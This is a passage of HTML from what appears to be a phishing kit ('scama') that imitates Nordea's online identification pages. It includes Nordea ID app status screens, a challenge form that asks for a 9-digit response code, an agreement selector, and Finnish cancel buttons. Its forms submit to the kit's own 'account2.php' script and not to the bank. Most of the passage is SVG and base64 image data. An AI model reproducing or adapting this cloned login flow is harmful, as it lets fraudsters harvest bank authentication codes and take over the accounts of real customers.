BwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAAYPlBwgQyAgYrExVghIgYLD8AAECGQGDlalKUAIEDJYfIEAgI2CwMlUJSoCAwfIDBAhkBAxWpipBCRAwWH6AAIGMgMHKVCUoAQIGyw8QIJARMFiZqgQlQMBg+QECBDICBitTlaAECBgsP0CAQEbAYGWqEpQAgQdWMQCX4yW9owAAAABJRU5ErkJggg=="></canvas>
                        </div>
                    </div>
                    <div id="sign-text-codesapp" class="hidden sign-text"></div>
                    <div class="transaction-correlation-id-container hidden" aria-live="polite" tabindex="0">
                       

                    </div>
                    <div id="status-container-codesapp" tabindex="-1" aria-live="assertive" class="hidden">
                        <div class="status-texts">
                            <div class="status-text status-text-ok" aria-role="status">Success</div>
                            <div class="status-text status-text-cp" aria-role="status">Please enter your PIN or
                                authenticate with biometric identifier.</div>
                            <div id="status-text-codesapp" class="status-text status-text-ap" aria-role="status">Please
                                open the Nordea ID app or cancel.</div>
                        </div>
                        <div class="status-images" aria-hidden="true">
                            <div class="status-img-p"><svg class="mobile-status-pending" viewBox="0 0 288 216">
                                    <defs>
                                        <style>
                                            .c2 {
                                                fill: #00f
                                            }

                                            .d2 {
                                                fill: #e5f2ff
                                            }

                                            .g2 {
                                                fill: #39f;
                                                opacity: .3
                                            }
                                        </style>
                                    </defs>
                                    <path class="status-pending-device-shadow" d="M251.85 131.39l-133.34 77.48a12.57 12.57 0 0 1-12.61 0l-59.7-34.45a7.54 7.54 0 0 1 0-13.06l133.32-77.49a12.56 12.56 0 0 1 12.6 0l59.71 34.47a7.55 7.55 0 0 1 .02 13.05z" fill="#cebbb2" opacity=".5"></path>
                                    <g class="status-pending-device">
                                        <path class="c2" d="M42.4 112.2v15.56a7.46 7.46 0 0 0 3.76 6.39l59.71 34.47a12.56 12.56 0 0 0 12.6 0l133.35-77.5a7.46 7.46 0 0 0 3.74-6.2V68z">
                                        </path>
                                        <path class="d2" d="M251.82 74.73l-133.34 77.49a12.58 12.58 0 0 1-12.6 0l-59.71-34.45a7.55 7.55 0 0 1 0-13.06l133.32-77.49a12.6 12.6 0 0 1 12.61 0l59.7 34.47a7.54 7.54 0 0 1 .02 13.04z">
                                        </path>
                                        <path fill="#9cf" d="M177.05 36.16L57.48 105.62l62.89 36.92 119.6-69.48"></path>
                                        <path class="c2" d="M205 45.15l9.58 5.38a1.59 1.59 0 0 0 1.78-.15.59.59 0 0 0-.08-1l-9.47-5.27a1.66 1.66 0 0 0-1.9.21.5.5 0 0 0 .09.83z">
                                        </path>
                                        <ellipse class="c2" cx="223.05" cy="54.46" rx=".75" ry="1.31" transform="rotate(-88.64 223.067 54.458)"></ellipse>
                                        <ellipse class="c2" cx="219.82" cy="52.55" rx=".75" ry="1.31" transform="rotate(-88.64 219.83 52.548)"></ellipse>
                                        <path fill="#39f" d="M239.97 73.06l-62.92-36.9-119.57 69.46 4.3 2.52 115.01-66.8 58.58 34.39 4.6-2.67z">
                                        </path>
                                    </g>
                                    <g class="status-pending-step status-pending-step-1">
                                        <path class="c2" d="M95 28.49c.22 5.1-6.54 9.53-15.09 9.9s-15.66-3.47-15.88-8.57 6.7-5.54 15.26-5.91S94.8 23.39 95 28.49z">
                                        </path>
                                        <path class="c2" d="M64.16 22.66h30.95v5.96H64.16z"></path>
                                        <ellipse class="d2" cx="79.62" cy="22.66" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                    <g class="status-pending-step status-pending-step-2">
                                        <path class="c2" d="M124.53 46.59c0 5.11-6.94 9.24-15.5 9.24s-15.5-4.13-15.5-9.24 6.94-5.25 15.5-5.25 15.5.15 15.5 5.25z">
                                        </path>
                                        <path class="c2" d="M93.58 40.1h30.95v5.96H93.58z"></path>
                                        <ellipse class="d2" cx="109.03" cy="40.1" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                    <g class="status-pending-step status-pending-step-3">
                                        <ellipse class="g2" cx="138" cy="80.31" rx="15.5" ry="9.24"></ellipse>
                                        <path class="c2" d="M153.49 64.6c0 5.11-6.93 9.25-15.49 9.25s-15.5-4.14-15.5-9.25 6.94-5.25 15.5-5.25 15.49.15 15.49 5.25z">
                                        </path>
                                        <path class="c2" d="M122.54 58.12h30.95v5.96h-30.95z"></path>
                                        <ellipse class="d2" cx="138" cy="58.12" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                    <g class="status-pending-step status-pending-step-4">
                                        <ellipse class="g2" cx="167.35" cy="98.33" rx="15.5" ry="9.24"></ellipse>
                                        <path class="c2" d="M182.84 82.62c0 5.1-6.93 9.24-15.49 9.24s-15.5-4.14-15.5-9.24 6.94-5.25 15.5-5.25 15.49.14 15.49 5.25z">
                                        </path>
                                        <path class="c2" d="M151.89 76.13h30.95v5.96h-30.95z"></path>
                                        <ellipse class="d2" cx="167.35" cy="76.13" rx="15.5" ry="9.24"></ellipse>
                                    </g>
                                </svg></div>
                            <div class="status-img-ok"><svg class="status-success" viewBox="0 0 320 264">
                                    <defs>
                                        <style>
                                            .a1 {
                                                fill: #00f
                                            }

                                            .b1 {
                                                fill: #9cf
                                            }

                                            .c1 {
                                                fill: #39f
                                            }

                                            .f1 {
                                                opacity: .5
                                            }

                                            .g1 {
                                                fill: #5cadff
                                            }

                                            .h1 {
                                                fill: #fff
                                            }
                                        </style>
                                        <clippath id="codesapp-ok">
                                            <path class="a1" d="M208.61 119.83C189.9 87.41 158.53 70.47 138.56 82l-17.7 10.22s2.77 47.44 15.42 69.36c12.15 21 50.83 48.85 50.83 48.85l19.22-11c19.98-11.55 21-47.18 2.28-79.6z">
                                            </path>
                                        </clippath>
                                    </defs>
                                    <path class="a" d="M66.113 76.318l44.122-38.64 8.822 10.073-44.122 38.64z"></path>
                                    <ellipse class="b1" cx="88.18" cy="56.99" rx="29.32" ry="5.76" transform="rotate(-41.21 88.194 56.99)"></ellipse>
                                    <ellipse class="b1" cx="88.18" cy="56.99" rx="29.32" ry="5.76" transform="rotate(-41.21 88.194 56.99)"></ellipse>
                                    <ellipse class="c1" cx="88.18" cy="56.99" rx="20.39" ry="2.66" transform="rotate(-41.21 88.194 56.99)"></ellipse>
                                    <ellipse class="a1" cx="97" cy="67.06" rx="29.32" ry="5.76" transform="rotate(-41.21 97.002 67.07)"></ellipse>
                                    <path class="a1" d="M208.61 119.83C189.9 87.41 158.53 70.47 138.56 82l-17.7 10.22s2.77 47.44 15.42 69.36c12.15 21 50.83 48.85 50.83 48.85l19.22-11c19.98-11.55 21-47.18 2.28-79.6z">
                                    </path>
                                    <g clip-path="url(#codesapp-ok)">
                                        <path opacity=".5" fill="#39f" d="M155.85 95.32l19.83-11.45 14.76 11.05-20.21 11.68-14.38-11.28z"></path>
                                        <g class="f1">
                                            <path class="c1" d="M162.83 78.82l-19.05 11 6.33 3.05 19.46-11.24-6.74-2.81z"></path>
                                        </g>
                                        <g class="f1">
                                            <path class="c1" d="M203.79 111.61l-19.05 11 3.18 4.87 19.85-11.46-3.98-4.41z"></path>
                                        </g>
                                    </g>
                                    <ellipse class="b1" cx="154.75" cy="150.92" rx="41.76" ry="67.78" transform="rotate(-30 154.727 150.899)"></ellipse>
                                    <path class="c1" d="M134.53 106.43a19.79 19.79 0 0 1 11.84-2.37c-7.37-3.06-14.47-3.34-20.06-.06-14.3 8.25-13.66 36.12 1.42 62.24 6.54 11.34 14.73 20.48 23.07 26.53A100.88 100.88 0 0 1 136.05 173c-16.13-27.93-16.81-57.74-1.52-66.57z">
                                    </path>
                                    <path class="g1" d="M180.91 198.55c14.3-8.25 13.66-36.12-1.42-62.24-9.17-15.9-21.59-27.48-33.12-32.25a19.79 19.79 0 0 0-11.84 2.37c-15.29 8.83-14.61 38.64 1.52 66.6a100.88 100.88 0 0 0 14.75 19.69c10.88 7.88 22.02 10.5 30.11 5.83z">
                                    </path>
                                    <path class="a1" d="M36.822 184.282l41.472 41.472-9.468 9.468-41.472-41.472z">
                                    </path>
                                    <ellipse class="b1" cx="57.56" cy="205.02" rx="5.76" ry="29.32" transform="rotate(-45 57.561 205.017)"></ellipse>
                                    <ellipse class="b1" cx="57.56" cy="205.02" rx="5.76" ry="29.32" transform="rotate(-45 57.561 205.017)"></ellipse>
                                    <ellipse class="c1" cx="57.56" cy="205.02" rx="2.66" ry="20.39" transform="rotate(-45 57.561 205.017)"></ellipse>
                                    <ellipse class="a1" cx="48.09" cy="214.49" rx="5.76" ry="29.32" transform="rotate(-45 48.094 214.489)"></ellipse>
                                    <path class="h1" d="M139.836 160.559l30.683-17.715 4.3 7.448-30.683 17.715z"></path>
                                    <path class="h1" d="M144.154 167.993l-11-19.053 6.374-3.68 11 19.053z"></path>
                                    <path class="a1" d="M267.59 21.62l-7.55 4.09-.01 32.88 26.3 16.66 7.43-4.04-26.17-49.59z"></path>
                                    <ellipse class="a1" cx="272.93" cy="50.61" rx="17.28" ry="28.05" transform="rotate(-28.55 272.897 50.623)"></ellipse>
                                    <ellipse class="b1" cx="280.36" cy="46.57" rx="17.28" ry="28.05" transform="rotate(-28.55 280.33 46.572)"></ellipse>
                                    <path class="c1" d="M270.19 30.59c6.24-3.4 16.34 3.1 22.55 14.51a41.11 41.11 0 0 1 3.08 7.21 37 37 0 0 0-4.12-11.77c-6-11-15.67-17.21-21.67-13.95-3.45 1.88-4.91 6.5-4.41 12.17.43-3.76 1.94-6.76 4.57-8.17z">
                                    </path>
                                    <path class="g1" d="M291.63 66.3c3.82-2.08 5.21-7.5 4.19-14a41.11 41.11 0 0 0-3.08-7.21c-6.21-11.41-16.31-17.91-22.55-14.51-2.63 1.43-4.14 4.38-4.57 8.17A36 36 0 0 0 270 52.36c5.93 10.96 15.63 17.2 21.63 13.94z">
                                    </path>
                                </svg></div>
                        </div>
                        <div class="button-group-vertical">
                            <div><button class="hidden" id="open-codesapp">Open</button></div>
                        </div>
                    </div>
                    <div class="button-group">
                        <div><button class="link cancel-codesapp">Peruuta</button></div>
                        <div id="codesapp-qr-help-button" class="hidden">
                            <button class="link sidebar-toggler" data-flow-info-target="poller"><span class="help-button-text">Tarvitsetko apua?</span>
                                <span class="help-button-text hidden">Close help</span></button>
                        </div>
                    </div>
                </div>






                <div data-view-id="collision" class="collision-content" tabindex="-1">
                    <img class="lazy-image" data-savepage-currentsrc="#/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg" data-savepage-src="/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg" src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjEyMCIgdmVyc2lvbj0iMSIgd2lkdGg9IjE0NCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTQyLjQgNTQuM2MwIDE2LjQuMSAzMC41LTE2LjEgNDAuOC0xNC42IDkuMy0zMC4zIDE1LjctNTEuNyAxNS43LTIyLjYgMC0zNi45LTcuMy01MS42LTE3LjVTMS41IDcyLjQgMS41IDU2LjhjMC0xNSA0LjEtMjUuNSAxNy44LTM1LjYgMTQuOS0xMSAyOC41LTE2LjEgNTIuMS0xNi4xIDE5LjQgMCAyNS4yIDAgMzkuMiA3LjggMTguNiAxMC41IDMxLjggMjMuNiAzMS44IDQxLjR6IiBmaWxsPSIjRTZFNEUzIiBvcGFjaXR5PSIuNSIvPjxwYXRoIGQ9Ik0xMzcuOCA1My43YzAgMTQuMS02LjEgMjUuOC0yMCAzNC43LTEyLjUgOC0xOS4xIDE3LjYtMzcuNSAxNy42LTE5LjQgMC0zOC45LTUuNS01MS42LTE0LjNTNiA3NC44IDYgNjEuNGMwLTEyLjggMC0yNC42IDExLjgtMzMuMyAxMi44LTkuNCAzMi42LTE3IDUyLjgtMTcgMTYuNyAwIDE5LjggMy43IDMxLjkgMTAuNCAxNiA5IDM1LjMgMTcgMzUuMyAzMi4yeiIgZmlsbD0iI0U2RTRFMyIvPjxwYXRoIGQ9Ik0zOC43IDg0LjhWMzQuM2MwLTQuMyAyLjMtOC4zIDYtMTAuNUw4My4zIDEuNGM0LjUtMS4zIDExLjIgNC40IDExLjEgNWwuMSA1Mi4zLTUuOS0yLjctNy45LTYuNC0yLjkgMTguOC01LjgtMi44LTguMy02LjktMS41IDE4LjctNS44LTIuOC05LjMtOC0yLjYgMjEtNS44LTIuOCIgZmlsbD0iI0M5QzdDNyIvPjxwYXRoIGQ9Ik00NC41IDg3LjZWMzdjMC00LjMgMi4zLTguMyA2LTEwLjVMODkuMSA0LjJjMS43LTEgMy45LS40IDQuOSAxLjMuMy41LjUgMS4yLjUgMS44djUxLjVsLTcuOS02LjQtOC43IDE2LTguMy02LjktNy4zIDE2LTkuMy04LTguNSAxOC4xIiBmaWxsPSIjRkZGIi8+PHBhdGggZD0iTTk0LjQgMTEuNFY3LjNjMC0yLTEuNi0zLjYtMy42LTMuNi0uNiAwLTEuMi4yLTEuOC41TDUwLjUgMjYuNmMtMy43IDIuMi02IDYuMS02IDEwLjV2M2w0OS45LTI4Ljd6IiBmaWxsPSIjRTZFNEUzIi8+PGVsbGlwc2UgY3g9IjkwLjciIGN5PSI4LjYiIGZpbGw9IiM4QjhBOEQiIHJ4PSIyLjEiIHJ5PSIxLjUiIHRyYW5zZm9ybT0icm90YXRlKC01My4zNTIgOTAuNjY1IDguNjUpIi8+PGVsbGlwc2UgY3g9Ijg1LjEiIGN5PSIxMS44IiBmaWxsPSIjOEI4QThEIiByeD0iMi4xIiByeT0iMS41IiB0cmFuc2Zvcm09InJvdGF0ZSgtNTMuMzUyIDg1LjA1IDExLjgyMikiLz48ZWxsaXBzZSBjeD0iNzkuMyIgY3k9IjE1LjQiIGZpbGw9IiM4QjhBOEQiIHJ4PSIyLjEiIHJ5PSIxLjUiIHRyYW5zZm9ybT0icm90YXRlKC01My4zNTIgNzkuMzM4IDE1LjM3OCkiLz48cGF0aCBmaWxsPSIjRTZFNEUzIiBvcGFjaXR5PSIuNSIgZD0iTTczLjUgNjQuOGw0LjMgMy41IDguNy0xNiAxLjkgMS42IDYtMTMuMVYxOS45eiIvPjxwYXRoIGQ9Ik05NC40IDU4LjhWNy4zYzAtLjMgMC0uNS0uMS0uOHYtLjFDOTQgNSA5Mi44IDQgOTEuNCAzLjhjLTIuMy0xLjYtNS42LTMuMS04LjEtMi40TDQ0LjcgMjMuOGMtMy43IDIuMi02IDYuMi02IDEwLjV2NTAuNWw1LjggMi44IiBmaWxsPSJub25lIiBzdHJva2U9IiM4QjhBOEQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiLz48cGF0aCBkPSJNOTguMiA3Mi4zdjEyLjNjMCAzLjQtMS44IDYuNi00LjggOC4zbC0zNC45IDI1LjNjLTIuOCAxLjYtMTAuMi0zLjEtMTAuMi02LjN2LTEwLjdsNy45LTE4LjQgNC41IDIuNCA0LjIgNi4zIDguMy0xNy45IDQuNSAyLjQgMi44IDYuNCA5LjMtMTYuOCA0LjUgMi40IDMuOSA0LjMiIGZpbGw9IiNDOUM3QzciLz48cGF0aCBkPSJNMTAyLjcgNzQuOFY4N2MwIDMuNC0xLjggNi42LTQuOCA4LjNMNTkgMTE3LjljLTIgMS4yLTQuNS41LTUuNy0xLjUtLjQtLjYtLjYtMS40LS42LTIuMXYtMTAuN2w3LjktMTguNCA4LjcgOC44IDguMy0xNy45TDg1IDg1bDkuMy0xNi44IDguNCA2LjYiIGZpbGw9IiNGRkYiLz48cGF0aCBkPSJNMTAyLjcgNzQuOGwtOC40LTYuNkw4NSA4NWwtNy4zLTguOUw2OS40IDk0bC04LjctOC44LTcuOSAxOC40djEwLjdjMCAyLjMgMS45IDQuMiA0LjIgNC4yLjcgMCAxLjUtLjIgMi4xLS42bDM4LjgtMjIuNmMzLTEuNyA0LjgtNC45IDQuOC04LjNWNzQuOCIgZmlsbD0iI0ZGRiIvPjxwYXRoIGZpbGw9IiNFNkU0RTMiIG9wYWNpdHk9Ii41IiBkPSJNNzcuNyA3Ni4xbC0xOS4yIDQyLjEgMTQuNC04LjMgMTIuMS0yNXpNOTcuMiA3MC40bC0xNi41IDM1IDIuNy0xLjYgMTUuMy0zMi4yeiIvPjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzhCOEE4RCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBzdHJva2Utd2lkdGg9IjEuNSIgZD0iTTEwMi43IDc0LjhsLTguNC02LjctNC41LTIuNC04LjMgMTUtMy44LTQuNi00LjUtMi40LTcuNiAxNi40LTQuOS00LjktNC41LTIuNS03LjkgMTguNCIvPjxwYXRoIGQ9Ik00OC4zIDEwMS4xdjEwLjdjMCAzLjIgNy40IDggMTAuMiA2LjNsLjYtLjMgMzguOC0yMi42YzMtMS43IDQuOC00LjkgNC44LTguM1Y3NC44IiBmaWxsPSJub25lIiBzdHJva2U9IiM4QjhBOEQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiLz48cGF0aCBmaWxsPSJub25lIiBzdHJva2U9IiNDOUM3QzciIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xMDIuNyA1Ni41TDEwNyA0OU0xMDQuOSA2My41bDkuNS0xLjJNMjEuOSA5My4xbDEwLjgtMS4zTTMyIDEwOC45bDYuMi03LjQiLz48L3N2Zz4=" alt="You are already logging in from somewhere else." aria-hidden="true" data-src="/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg">
                    <p class="error-message">Several simultaneous identification/confirmation attempts.</p>
                    <button class="try-again-codesapp try-again-bankidse">Try again</button>
                    <div class="button-group">
                        <div><button class="link cancel-codesapp cancel-bankidse">Peruuta</button></div>
                    </div>
                </div>








                <div data-view-id="challenge-form">
                    <form action="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php#" class="challenge-form" id="challenge-form" autocomplete="off" role="form">
                        <div id="challenge-extra-info" class="hidden description"></div>
                        <div id="sign-text" class="sign-text hidden" tabindex="0"></div>
                        <div class="input-wrapper">
                            <div class="challenge-code">
                                <div aria-hidden="true" class="label">Challenge</div>
                                <div class="challenge-val" tabindex="0" aria-live="polite">
                                    <span class="visually-hidden">Challenge</span>
                                    <span id="challenge-val"></span>
                                </div>
                            </div>
                            <input class="input" id="challenge-input" data-manage="" data-format="" inputmode="numeric" type="text" name="challenge-input" minlength="9" maxlength="11" data-min="9" data-max="11" data-validation="^[0-9\s]+$" value="">
                            <label for="challenge-input">Response code</label>
                            <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
                                <span class="input-error-text">Please enter the response code, 9 digits.</span>
                            </div>
                        </div>
                        <div id="resp-error" class="hidden response-error-container" aria-live="assertive" role="alert">
                            Invalid information entered. Please try again.</div>
                        <button type="submit" id="challenge-button" aria-disabled="true">OK</button>
                    </form>
                    <div class="button-group">
                        <div><button id="challenge-cancel" class="link">Peruuta</button></div>
                    </div>
                </div>

















                <div data-view-id="agreements">
                    <form action="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php#" id="agreements-form" role="form">
                        <fieldset tabindex="-1" id="agreements-group">
                            <legend class="agreements-title sub-title">Select agreement</legend>
                            <div class="agreements" id="agreements" x-ms-format-detection="none"></div>
                            <div class="agreements-blocked-info" id="agreements-blocked-info">You have one or more
                                inactive agreements. Please contact Nordea to reactivate the agreements.</div>
                        </fieldset>
                        <button type="submit" class="agreements-submit-btn" id="agreements-submit-btn" aria-label="Select agreement">OK</button>
                    </form>
                    <div class="button-group">
                        <div><button class="button link" id="agreements-cancel">Peruuta</button></div>
                    </div>
                    <div aria-live="polite" class="visually-hidden" id="agreements-blocked-info-text"></div>
                </div>

                <div data-view-id="error" class="error-content" role="alertdialog" aria-labelledby="error-message" id="error-view">
                    <div id="errors" class="errors">
                        <img class="hidden lazy-image" id="default-error" data-savepage-currentsrc="#/assets/images/something-went-wrong-9bbd07dc81f3c2a11d2c7735b416ee18.svg" data-savepage-src="/assets/images/something-went-wrong-9bbd07dc81f3c2a11d2c7735b416ee18.svg" src="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php" alt="Something went wrong." data-src="/assets/images/something-went-wrong-9bbd07dc81f3c2a11d2c7735b416ee18.svg">
                        <img class="hidden lazy-image" id="cancel-error" data-savepage-currentsrc="#/assets/images/cancel-d0c0f9d25ebde42bbd552c8ad5363f01.svg" data-savepage-src="/assets/images/cancel-d0c0f9d25ebde42bbd552c8ad5363f01.svg" src="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php" alt="Authentication was cancelled." data-src="/assets/images/cancel-d0c0f9d25ebde42bbd552c8ad5363f01.svg">
                        <img class="hidden lazy-image" id="request-error" data-savepage-currentsrc="#/assets/images/no-connection-83f79e2367a313b468986e12a237c346.svg" data-savepage-src="/assets/images/no-connection-83f79e2367a313b468986e12a237c346.svg" src="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php" alt="Something went wrong." data-src="/assets/images/no-connection-83f79e2367a313b468986e12a237c346.svg">
                        <img class="hidden lazy-image" id="empty-error" data-savepage-currentsrc="#/assets/images/empty-1LRn7buj6Aa5zRxq3aQurEzwKR9ERqdFA8.svg" data-savepage-src="/assets/images/empty-1LRn7buj6Aa5zRxq3aQurEzwKR9ERqdFA8.svg" src="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php" alt="You have no agreements available. 
Please contact us." data-src="/assets/images/empty-1LRn7buj6Aa5zRxq3aQurEzwKR9ERqdFA8.svg">
                        <img class="hidden lazy-image" id="technical-error" data-savepage-currentsrc="#/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg" data-savepage-src="/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg" src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjEyMCIgdmVyc2lvbj0iMSIgd2lkdGg9IjE0NCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTQyLjQgNTQuM2MwIDE2LjQuMSAzMC41LTE2LjEgNDAuOC0xNC42IDkuMy0zMC4zIDE1LjctNTEuNyAxNS43LTIyLjYgMC0zNi45LTcuMy01MS42LTE3LjVTMS41IDcyLjQgMS41IDU2LjhjMC0xNSA0LjEtMjUuNSAxNy44LTM1LjYgMTQuOS0xMSAyOC41LTE2LjEgNTIuMS0xNi4xIDE5LjQgMCAyNS4yIDAgMzkuMiA3LjggMTguNiAxMC41IDMxLjggMjMuNiAzMS44IDQxLjR6IiBmaWxsPSIjRTZFNEUzIiBvcGFjaXR5PSIuNSIvPjxwYXRoIGQ9Ik0xMzcuOCA1My43YzAgMTQuMS02LjEgMjUuOC0yMCAzNC43LTEyLjUgOC0xOS4xIDE3LjYtMzcuNSAxNy42LTE5LjQgMC0zOC45LTUuNS01MS42LTE0LjNTNiA3NC44IDYgNjEuNGMwLTEyLjggMC0yNC42IDExLjgtMzMuMyAxMi44LTkuNCAzMi42LTE3IDUyLjgtMTcgMTYuNyAwIDE5LjggMy43IDMxLjkgMTAuNCAxNiA5IDM1LjMgMTcgMzUuMyAzMi4yeiIgZmlsbD0iI0U2RTRFMyIvPjxwYXRoIGQ9Ik0zOC43IDg0LjhWMzQuM2MwLTQuMyAyLjMtOC4zIDYtMTAuNUw4My4zIDEuNGM0LjUtMS4zIDExLjIgNC40IDExLjEgNWwuMSA1Mi4zLTUuOS0yLjctNy45LTYuNC0yLjkgMTguOC01LjgtMi44LTguMy02LjktMS41IDE4LjctNS44LTIuOC05LjMtOC0yLjYgMjEtNS44LTIuOCIgZmlsbD0iI0M5QzdDNyIvPjxwYXRoIGQ9Ik00NC41IDg3LjZWMzdjMC00LjMgMi4zLTguMyA2LTEwLjVMODkuMSA0LjJjMS43LTEgMy45LS40IDQuOSAxLjMuMy41LjUgMS4yLjUgMS44djUxLjVsLTcuOS02LjQtOC43IDE2LTguMy02LjktNy4zIDE2LTkuMy04LTguNSAxOC4xIiBmaWxsPSIjRkZGIi8+PHBhdGggZD0iTTk0LjQgMTEuNFY3LjNjMC0yLTEuNi0zLjYtMy42LTMuNi0uNiAwLTEuMi4yLTEuOC41TDUwLjUgMjYuNmMtMy43IDIuMi02IDYuMS02IDEwLjV2M2w0OS45LTI4Ljd6IiBmaWxsPSIjRTZFNEUzIi8+PGVsbGlwc2UgY3g9IjkwLjciIGN5PSI4LjYiIGZpbGw9IiM4QjhBOEQiIHJ4PSIyLjEiIHJ5PSIxLjUiIHRyYW5zZm9ybT0icm90YXRlKC01My4zNTIgOTAuNjY1IDguNjUpIi8+PGVsbGlwc2UgY3g9Ijg1LjEiIGN5PSIxMS44IiBmaWxsPSIjOEI4QThEIiByeD0iMi4xIiByeT0iMS41IiB0cmFuc2Zvcm09InJvdGF0ZSgtNTMuMzUyIDg1LjA1IDExLjgyMikiLz48ZWxsaXBzZSBjeD0iNzkuMyIgY3k9IjE1LjQiIGZpbGw9IiM4QjhBOEQiIHJ4PSIyLjEiIHJ5PSIxLjUiIHRyYW5zZm9ybT0icm90YXRlKC01My4zNTIgNzkuMzM4IDE1LjM3OCkiLz48cGF0aCBmaWxsPSIjRTZFNEUzIiBvcGFjaXR5PSIuNSIgZD0iTTczLjUgNjQuOGw0LjMgMy41IDguNy0xNiAxLjkgMS42IDYtMTMuMVYxOS45eiIvPjxwYXRoIGQ9Ik05NC40IDU4LjhWNy4zYzAtLjMgMC0uNS0uMS0uOHYtLjFDOTQgNSA5Mi44IDQgOTEuNCAzLjhjLTIuMy0xLjYtNS42LTMuMS04LjEtMi40TDQ0LjcgMjMuOGMtMy43IDIuMi02IDYuMi02IDEwLjV2NTAuNWw1LjggMi44IiBmaWxsPSJub25lIiBzdHJva2U9IiM4QjhBOEQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiLz48cGF0aCBkPSJNOTguMiA3Mi4zdjEyLjNjMCAzLjQtMS44IDYuNi00LjggOC4zbC0zNC45IDI1LjNjLTIuOCAxLjYtMTAuMi0zLjEtMTAuMi02LjN2LTEwLjdsNy45LTE4LjQgNC41IDIuNCA0LjIgNi4zIDguMy0xNy45IDQuNSAyLjQgMi44IDYuNCA5LjMtMTYuOCA0LjUgMi40IDMuOSA0LjMiIGZpbGw9IiNDOUM3QzciLz48cGF0aCBkPSJNMTAyLjcgNzQuOFY4N2MwIDMuNC0xLjggNi42LTQuOCA4LjNMNTkgMTE3LjljLTIgMS4yLTQuNS41LTUuNy0xLjUtLjQtLjYtLjYtMS40LS42LTIuMXYtMTAuN2w3LjktMTguNCA4LjcgOC44IDguMy0xNy45TDg1IDg1bDkuMy0xNi44IDguNCA2LjYiIGZpbGw9IiNGRkYiLz48cGF0aCBkPSJNMTAyLjcgNzQuOGwtOC40LTYuNkw4NSA4NWwtNy4zLTguOUw2OS40IDk0bC04LjctOC44LTcuOSAxOC40djEwLjdjMCAyLjMgMS45IDQuMiA0LjIgNC4yLjcgMCAxLjUtLjIgMi4xLS42bDM4LjgtMjIuNmMzLTEuNyA0LjgtNC45IDQuOC04LjNWNzQuOCIgZmlsbD0iI0ZGRiIvPjxwYXRoIGZpbGw9IiNFNkU0RTMiIG9wYWNpdHk9Ii41IiBkPSJNNzcuNyA3Ni4xbC0xOS4yIDQyLjEgMTQuNC04LjMgMTIuMS0yNXpNOTcuMiA3MC40bC0xNi41IDM1IDIuNy0xLjYgMTUuMy0zMi4yeiIvPjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzhCOEE4RCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBzdHJva2Utd2lkdGg9IjEuNSIgZD0iTTEwMi43IDc0LjhsLTguNC02LjctNC41LTIuNC04LjMgMTUtMy44LTQuNi00LjUtMi40LTcuNiAxNi40LTQuOS00LjktNC41LTIuNS03LjkgMTguNCIvPjxwYXRoIGQ9Ik00OC4zIDEwMS4xdjEwLjdjMCAzLjIgNy40IDggMTAuMiA2LjNsLjYtLjMgMzguOC0yMi42YzMtMS43IDQuOC00LjkgNC44LTguM1Y3NC44IiBmaWxsPSJub25lIiBzdHJva2U9IiM4QjhBOEQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiLz48cGF0aCBmaWxsPSJub25lIiBzdHJva2U9IiNDOUM3QzciIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xMDIuNyA1Ni41TDEwNyA0OU0xMDQuOSA2My41bDkuNS0xLjJNMjEuOSA5My4xbDEwLjgtMS4zTTMyIDEwOC45bDYuMi03LjQiLz48L3N2Zz4=" alt="Something went wrong." data-src="/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg">
                    </div>


                    <p id="error-message" class="error-message"></p>
                    <button id="error-close" type="button">Start over</button>
                    <div class="button-group">
                        <div><button class="link cancel-link">Peruuta</button></div>
                    </div>
                </div>


